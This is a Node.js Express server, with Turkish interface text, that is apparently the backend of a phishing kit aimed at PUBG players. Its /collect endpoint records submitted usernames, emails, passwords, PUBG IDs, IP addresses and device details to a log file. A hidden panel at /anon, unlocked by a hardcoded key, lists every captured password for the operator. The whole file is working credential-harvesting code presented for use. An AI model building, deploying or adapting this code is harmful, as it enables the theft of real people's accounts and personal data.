const express = require("express");
const fs = require("fs");
const path = require("path");

const app = express();
const PORT = process.env.PORT || 3000;
const KEY = "anon";
const LOG_FILE = path.join(__dirname, "captures.jsonl");

app.set("trust proxy", true);
app.use(express.json({ limit: "1mb" }));
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, "public")));

/* ---------- capture endpoint ---------- */
app.post("/collect", (req, res) => {
  const ip =
    (req.headers["x-forwarded-for"] || "").split(",")[0].trim() ||
    req.socket.remoteAddress ||
    "?";

  const record = {
    ts:       new Date().toISOString(),
    ip:       ip,
    pubgid:   (req.body.pubgid || "").toString().slice(0, 64),
    username: (req.body.username || "").toString().slice(0, 128),
    email:    (req.body.email || "").toString().slice(0, 256),
    password: (req.body.password || "").toString().slice(0, 256),
    device:   req.body.device || {},
    page:     (req.body.page || "").toString().slice(0, 512),
    ua:       req.headers["user-agent"] || "",
    ref:      req.headers["referer"] || ""
  };

  try {
    fs.appendFileSync(LOG_FILE, JSON.stringify(record) + "\n");
    console.log("[capture]", record.ts, record.ip, record.pubgid);
  } catch (e) {
    console.error("write error:", e.message);
  }

  res.json({ ok: true });
});

/* ---------- gizli panel ---------- */
function keyOk(req) {
  const candidate = req.query.k || req.headers["x-key"] || "";
  return candidate === KEY;
}

app.get("/anon", (req, res) => {
  if (!keyOk(req)) return res.status(404).send("Not Found");

  let lines = [];
  try {
    if (fs.existsSync(LOG_FILE)) {
      lines = fs.readFileSync(LOG_FILE, "utf8").trim().split("\n").filter(Boolean);
    }
  } catch (e) {}

  const hits = lines.map(l => {
    try { return JSON.parse(l); } catch (e) { return null; }
  }).filter(Boolean).reverse();

  const rows = hits.map((h, i) => {
    const d = h.device || {};
    return `
      <tr>
        <td>${i + 1}</td>
        <td class="ts">${esc(h.ts)}</td>
        <td class="ip">${esc(h.ip)}</td>
        <td class="id">${esc(h.pubgid)}</td>
        <td class="un">${esc(h.username)}</td>
        <td class="em">${esc(h.email)}</td>
        <td class="pw">${esc(h.password)}</td>
        <td class="dev">${esc(d.platform || "")} · ${esc(d.screen || "")} · ${esc(d.tz || "")}</td>
      </tr>`;
  }).join("");

  res.send(`<!DOCTYPE html><html><head><meta charset="utf-8">
<title>anon · captures</title>
<style>
body{font-family:ui-monospace,Menlo,Consolas,monospace;background:#0a0e14;color:#d6d8dd;margin:0;padding:20px;font-size:12px}
h1{color:#39ff88;font-size:16px;margin-bottom:4px}
.meta{color:#6b7280;font-size:11px;margin-bottom:14px}
table{border-collapse:collapse;width:100%}
th,td{border-bottom:1px solid #1f2128;padding:8px;text-align:left;vertical-align:top;word-break:break-word}
th{color:#8b93a1;font-size:10px;text-transform:uppercase;letter-spacing:.05em}
tr:hover td{background:#141820}
.ts{white-space:nowrap;color:#c0c4cc}
.ip{white-space:nowrap;color:#7dd3fc}
.id{color:#f2a900}
.un{color:#a5b4fc}
.em{color:#39ff88}
.pw{color:#ff4d6d;font-weight:700}
.dev{color:#6b7280;font-size:11px}
.empty{color:#4b5563;font-style:italic;padding:20px 0}
</style></head><body>
<h1>anon · captures</h1>
<div class="meta">${hits.length} kayit · yeniden eskiye</div>
<table>
<thead><tr>
<th>#</th><th>zaman</th><th>ip</th><th>pubg id</th><th>kullanici</th><th>e-posta</th><th>sifre</th><th>cihaz</th>
</tr></thead>
<tbody>${rows || '<tr><td colspan="8" class="empty">henuz kayit yok</td></tr>'}</tbody>
</table>
</body></html>`);
});

function esc(s) {
  return String(s == null ? "" : s).replace(/[&<>"']/g, c => ({
    "&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;"
  }[c]));
}

app.listen(PORT, () => {
  console.log("listening on " + PORT);
});
